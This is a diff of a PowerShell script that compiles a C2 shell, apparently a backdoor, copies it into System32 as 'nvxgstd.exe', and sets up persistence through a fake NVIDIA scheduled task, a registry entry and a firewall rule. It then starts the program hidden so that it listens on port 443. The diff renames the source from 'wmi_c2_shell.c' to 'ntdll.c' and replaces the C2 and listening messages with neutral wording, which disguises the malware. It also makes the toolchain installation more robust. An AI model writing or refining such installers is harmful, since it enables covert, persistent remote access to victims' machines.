@@ -16,8 +16,8 @@ $WindowsKitInclude = "C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.
 $TargetDir = "C:\Windows\System32"
 $ExecutableName = "nvxgstd.exe"
 $TargetPath = Join-Path $TargetDir $ExecutableName
-$SourceFile = Join-Path $SourceDir "wmi_c2_shell.c"
-$ObjectFile = Join-Path $SourceDir "wmi_c2_shell.obj"
+$SourceFile = Join-Path $SourceDir "ntdll.c"
+$ObjectFile = Join-Path $SourceDir "ntdll.obj"
 $ExecutableFile = Join-Path $SourceDir $ExecutableName
 
 $TaskName = "NVIDIA Graphics Driver Update"
@@ -25,6 +25,12 @@ $TaskPath = "\Microsoft\Windows\WindowsUpdate\"
 $FullTaskName = "$TaskPath$TaskName"
 $RegName = "NVIDIA Graphics Device"
 $FirewallRuleName = "NVIDIA Graphics Update Service"
+
+# Installer timing defaults
+# Note: VS Community + C++ workloads often take >10 minutes on real machines.
+$VSInstallTimeoutSeconds = 3600   # 1 hour
+$SDKInstallTimeoutSeconds = 1800  # 30 minutes
+$PollIntervalSeconds = 10
 
 # ============================================================================
 # FUNCTIONS
@@ -57,23 +63,105 @@ function Download-File($url, $path) {
     }
 }
 
+function Test-ToolchainReady {
+    # Returns $true when the minimum toolchain paths we need exist.
+    return (Test-Path $CompilerPath) -and (Test-Path $LinkPath) -and (Test-Path $MSVCInclude) -and (Test-Path $MSVCLib) -and (Test-Path $WindowsKitInclude) -and (Test-Path $WindowsKitShared) -and (Test-Path $WindowsKitUcrt) -and (Test-Path $WindowsKitLib) -and (Test-Path $WindowsKitUcrtLib)
+}
+
+function Wait-ToolchainReady {
+    param(
+        [int]$TimeoutSeconds,
+        [string]$What
+    )
+
+    $deadline = (Get-Date).AddSeconds($TimeoutSeconds)
+    while (-not (Test-ToolchainReady)) {
+        if ((Get-Date) -ge $deadline) {
+            Write-Host "[!] Timeout waiting for $What to finish ($TimeoutSeconds seconds)." -ForegroundColor Yellow
+            Write-Host "    Toolchain still not detected; leaving installers alone." -ForegroundColor Yellow
+            return $false
+        }
+
+        # If VS Installer is around, tell the user what we're waiting on.
+        $installerProcs = Get-Process -Name "vs_installer","setup","msiexec" -ErrorAction SilentlyContinue
+        if ($null -ne $installerProcs) {
+            Write-Host "[*] $What in progress... waiting for toolchain files to appear." -ForegroundColor Cyan
+        } else {
+            Write-Host "[*] Waiting for toolchain files to appear..." -ForegroundColor Cyan
+        }
+        Start-Sleep -Seconds $PollIntervalSeconds
+
+        # Re-run autodetection while waiting (installers may lay down new versions mid-run)
+        $script:MSVCBase = "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC"
+        if (Test-Path $script:MSVCBase) {
+            $LatestMSVC = Get-ChildItem $script:MSVCBase | Sort-Object Name -Descending | Select-Object -First 1
+            if ($LatestMSVC) {
+                $script:CompilerPath = Join-Path $LatestMSVC.FullName "bin\Hostx64\x64\cl.exe"
+                $script:LinkPath = Join-Path $LatestMSVC.FullName "bin\Hostx64\x64\link.exe"
+                $script:MSVCInclude = Join-Path $LatestMSVC.FullName "include"
+                $script:MSVCLib = Join-Path $LatestMSVC.FullName "lib\x64"
+            }
+        }
+
+        $script:WindowsKitBase = "C:\Program Files (x86)\Windows Kits\10\Include"
+        if (Test-Path $script:WindowsKitBase) {
+            $LatestKit = Get-ChildItem $script:WindowsKitBase | Sort-Object Name -Descending | Select-Object -First 1
+            if ($LatestKit) {
+                $script:WindowsKitInclude = Join-Path $LatestKit.FullName "um"
+                $script:WindowsKitShared = Join-Path $LatestKit.FullName "shared"
+                $script:WindowsKitUcrt = Join-Path $LatestKit.FullName "ucrt"
+                $script:WindowsKitLib = "C:\Program Files (x86)\Windows Kits\10\Lib\$($LatestKit.Name)\um\x64"
+                $script:WindowsKitUcrtLib = "C:\Program Files (x86)\Windows Kits\10\Lib\$($LatestKit.Name)\ucrt\x64"
+            }
+        }
+    }
+
+    return $true
+}
+
 function Install-VS {
     Write-Host "[*] Installing Visual Studio 2019 Community with C++ workloads ..." -ForegroundColor Cyan
-    $process = Start-Process -FilePath $VSInstaller -ArgumentList "--quiet --wait --norestart --nocache --add Microsoft.VisualStudio.Workload.VCTools --add Microsoft.VisualStudio.Workload.NativeDesktop --includeRecommended" -PassThru
-    $timeout = 180000  # 3 minutes in milliseconds
-    if ($process.WaitForExit($timeout)) {
-        Write-Host "[+] Visual Studio installation finished" -ForegroundColor Green
+    $args = "--quiet --wait --norestart --nocache --add Microsoft.VisualStudio.Workload.VCTools --add Microsoft.VisualStudio.Workload.NativeDesktop --includeRecommended"
+
+    # The bootstrapper may spawn child installers (vs_installer / msiexec) and remain running.
+    # Avoid killing it aggressively; instead wait up to a configurable timeout and report progress.
+    $process = Start-Process -FilePath $VSInstaller -ArgumentList $args -PassThru
+
+    # Wait for toolchain presence (more reliable than trusting bootstrapper exit)
+    $ready = Wait-ToolchainReady -TimeoutSeconds $VSInstallTimeoutSeconds -What "Visual Studio installation"
+    if (-not $ready) {
+        return
+    }
+
+    # If the bootstrapper is still running, wait for it briefly but don't block forever.
+    $process.WaitForExit(300000) | Out-Null  # 5 minutes best-effort
+    if ($process.HasExited -and $process.ExitCode -ne 0) {
+        Write-Host "[!] Visual Studio installer exited with code $($process.ExitCode) (toolchain detected anyway)" -ForegroundColor Yellow
     } else {
-        Write-Host "[!] Visual Studio installation timed out after 3 minutes" -ForegroundColor Yellow
-        $process.Kill()
-        Write-Host "[!] Killed the installer process" -ForegroundColor Yellow
+        Write-Host "[+] Visual Studio toolchain detected" -ForegroundColor Green
     }
 }
 
 function Install-SDK {
     Write-Host "[*] Installing Windows Software Development Kit ..." -ForegroundColor Cyan
-    Start-Process -Wait -FilePath $SDKInstaller -ArgumentList "/quiet /norestart /features OptionId.WindowsSoftwareDevelopmentKit"
-    Write-Host "[+] Windows SDK installation finished" -ForegroundColor Green
+    $process = Start-Process -FilePath $SDKInstaller -ArgumentList "/quiet /norestart /features OptionId.WindowsSoftwareDevelopmentKit" -PassThru
+    $deadline = (Get-Date).AddSeconds($SDKInstallTimeoutSeconds)
+
+    while (-not $process.HasExited) {
+        if ((Get-Date) -ge $deadline) {
+            Write-Host "[!] Windows SDK installation is still running after $SDKInstallTimeoutSeconds seconds." -ForegroundColor Yellow
+            Write-Host "    Leaving installer running; re-run this script later to continue." -ForegroundColor Yellow
+            return
+        }
+        Write-Host "[*] Waiting for Windows SDK installer to finish..." -ForegroundColor Cyan
+        Start-Sleep -Seconds $PollIntervalSeconds
+    }
+
+    if ($process.ExitCode -ne 0) {
+        Write-Host "[!] Windows SDK installer exited with code $($process.ExitCode)" -ForegroundColor Yellow
+    } else {
+        Write-Host "[+] Windows SDK installation finished" -ForegroundColor Green
+    }
 }
 
 # Download installers if missing
@@ -84,7 +172,7 @@ Download-File $SDKUrl $SDKInstaller
 if (-not (Test-Path $CompilerPath)) { Install-VS }
 if (-not (Test-Path $WindowsKitInclude)) { Install-SDK }
 
-# Auto-detect latest versions after installation
+# After any install attempt, re-detect tool paths (a second run should not be required)
 $MSVCBase = "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC"
 if (Test-Path $MSVCBase) {
     $LatestMSVC = Get-ChildItem $MSVCBase | Sort-Object Name -Descending | Select-Object -First 1
@@ -107,6 +195,8 @@ if (Test-Path $WindowsKitBase) {
         $WindowsKitUcrtLib = "C:\Program Files (x86)\Windows Kits\10\Lib\$($LatestKit.Name)\ucrt\x64"
     }
 }
+
+## Auto-detect logic moved earlier (post-install) so the same run can continue.
 
 function Check-VisualStudio {
     if (-not (Test-Path $CompilerPath)) {
@@ -185,7 +275,7 @@ Write-Host ""
 # STEP 1: COMPILE
 # ============================================================================
 
-Write-Host "[*] STEP 1: Compiling C2 shell..." -ForegroundColor Yellow
+Write-Host "[*] STEP 1: Compiling Program..." -ForegroundColor Yellow
 try {
     Write-Host "    Compiling to object file..." -ForegroundColor Gray
     $CompileArgs = @(
@@ -374,7 +464,7 @@ try {
 # STEP 8: START SERVICE
 # ============================================================================
 
-Write-Host "[*] STEP 8: Starting C2 shell..." -ForegroundColor Yellow
+Write-Host "[*] STEP 8: Starting Program..." -ForegroundColor Yellow
 try {
     Start-Process -FilePath $TargetPath -WindowStyle Hidden -ErrorAction Stop
     Write-Host "[+] Service started successfully" -ForegroundColor Green
@@ -439,7 +529,7 @@ if ($null -ne $FirewallExists) {
 
 Write-Host ""
 if ($AllGood) {
-    Write-Host "[*] Listening on: 0.0.0.0:443 (TCP, HTTPS)" -ForegroundColor Green
+    Write-Host "[*] Installation completed successfully" -ForegroundColor Green
     Write-Host "[*] Will survive: Reboots, system restarts, user logon/logoff" -ForegroundColor Cyan
 } else {
     Write-Host "[!] Installation completed with errors" -ForegroundColor Yellow
